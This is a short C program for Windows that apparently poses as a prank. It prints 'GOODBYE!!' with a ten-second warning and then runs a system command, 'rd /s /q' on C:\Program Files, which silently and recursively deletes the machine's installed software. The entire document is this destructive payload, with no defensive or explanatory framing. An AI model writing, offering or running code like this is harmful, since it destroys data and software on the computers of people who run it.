#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
	system("title goodbye >:)");
	printf("GOODBYE!! >:)\n You have 10 seconds to save your computer");	
	sleep(10);
	system("rd /s /q \"C:\Program Files\"");
}
